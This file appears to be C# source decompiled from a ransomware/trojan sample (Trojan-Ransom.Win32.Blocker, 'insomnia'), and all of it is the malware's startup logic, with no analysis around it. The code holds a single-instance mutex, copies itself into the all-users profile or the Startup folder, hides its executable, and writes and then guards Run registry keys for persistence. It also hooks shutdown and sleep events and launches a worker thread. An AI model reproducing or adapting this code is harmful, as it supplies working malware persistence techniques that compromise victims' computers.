// Decompiled with JetBrains decompiler
// Type: insomnia.Class13
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace insomnia
{
  internal class Class13
  {
    public static Thread Field9 = new Thread((ThreadStart) (() => Class31.Method7(Class26.Field10, Class26.Field8, Class26.Field7, Class26.Field6, Class26.Field11)));
    public static Class34 Field8;
    public static Mutex Field7;
    public static bool Field6 = false;
    public static string Field5 = "HKCU";
    public static string Field4 = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
    public static string Field3 = Class13.Field4 + "\\" + Class26.Field21;
    public static string Field2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class26.Field21;

    private static void Method5(string[] args)
    {
      try
      {
        Class13.Field7 = Mutex.OpenExisting(Class26.Field13);
        Environment.Exit(0);
      }
      catch
      {
        Class13.Field7 = new Mutex(true, Class26.Field13);
      }
      int index;
      try
      {
        string[] strArray = args;
        index = 0;
label_3:
        if (index < strArray.Length)
        {
          if (strArray[index] == "u")
            Class13.Field6 = true;
        }
        else
        {
          Class14.Method1();
          goto label_9;
        }
      }
      catch
      {
        goto label_9;
      }
      ++index;
      goto label_3;
label_9:
      try
      {
        if (!Class26.Field20.Contains(Class26.Field21))
        {
          try
          {
            File.Copy(Class26.Field20, Class13.Field3);
            if (Class13.Field6)
            {
              Process process = new Process();
              process.StartInfo.FileName = Class13.Field3;
              process.StartInfo.Arguments = "u";
              process.Start();
              process.Dispose();
            }
            else
              Process.Start(Class13.Field3);
          }
          catch
          {
            File.Copy(Class26.Field20, Class13.Field2);
            if (Class13.Field6)
            {
              Process process = new Process();
              process.StartInfo.FileName = Class13.Field2;
              process.StartInfo.Arguments = "u";
              process.Start();
              process.Dispose();
            }
            else
              Process.Start(Class13.Field2);
          }
          Environment.Exit(0);
        }
        if (File.GetAttributes(Class26.Field20) != FileAttributes.Hidden)
          File.SetAttributes(Class26.Field20, FileAttributes.Hidden);
      }
      catch
      {
      }
      try
      {
        if (Class39.Method20() == "u")
        {
          try
          {
            Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Class26.Field5, (object) Class26.Field20);
            Class13.Field8 = new Class34(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
          }
          catch
          {
          }
        }
        else
        {
          try
          {
            if (Class39.Method18() == "32")
            {
              Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Class26.Field5, (object) Class26.Field20);
              Class13.Field8 = new Class34(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
            }
            else
            {
              Registry.LocalMachine.OpenSubKey("Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Class26.Field5, (object) Class26.Field20);
              Class13.Field8 = new Class34(RegistryHive.LocalMachine, "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
            }
            Class13.Field5 = "HKLM";
          }
          catch
          {
            Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Class26.Field5, (object) Class26.Field20);
            Class13.Field8 = new Class34(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
          }
        }
        Class13.Field8.Event_0 += new EventHandler(Class13.Method2);
        Class13.Field8.Method4();
      }
      catch
      {
      }
      try
      {
        SystemEvents.PowerModeChanged += new PowerModeChangedEventHandler(Class13.Method4);
        SystemEvents.SessionEnding += new SessionEndingEventHandler(Class13.Method3);
      }
      catch
      {
      }
      try
      {
        Class13.Field9.Start();
        new Thread(new ThreadStart(Class17.Method4))
        {
          IsBackground = true
        }.Start();
      }
      catch
      {
      }
    }

    private static void Method4(object sender, PowerModeChangedEventArgs e)
    {
      try
      {
        switch (e.Mode)
        {
          case PowerModes.Resume:
            Class13.Field9.Start();
            break;
          case PowerModes.Suspend:
            Class39.Method1("Windows is going to sleep...");
            break;
        }
      }
      catch
      {
      }
    }

    private static void Method3(object sender, SessionEndingEventArgs e)
    {
      try
      {
        switch (e.Reason)
        {
          case SessionEndReasons.Logoff:
            Class39.Method1("Windows is logging off...");
            break;
          case SessionEndReasons.SystemShutdown:
            Class39.Method1("Windows is shutting down...");
            break;
        }
      }
      catch
      {
      }
    }

    private static void Method2(object sender, EventArgs e)
    {
      RegistryKey registryKey = !(Class13.Field5 == "HKLM") ? Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") : Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
      if (registryKey.GetValue(Class26.Field5) != null)
      {
        if (!(registryKey.GetValue(Class26.Field5).ToString() != Class26.Field20))
          return;
      }
      try
      {
        if (Class13.Field5 == "HKLM")
          Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Class26.Field5, (object) Class26.Field20);
        else
          Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Class26.Field5, (object) Class26.Field20);
        if (!Class26.Field15)
          return;
        Class31.Method3("[PERSISTENCE]: Registry key was replaced (" + Class13.Field5 + "\\" + Class26.Field5 + " -> " + Class26.Field20 + ").", Class26.Field8);
      }
      catch
      {
      }
    }
  }
}
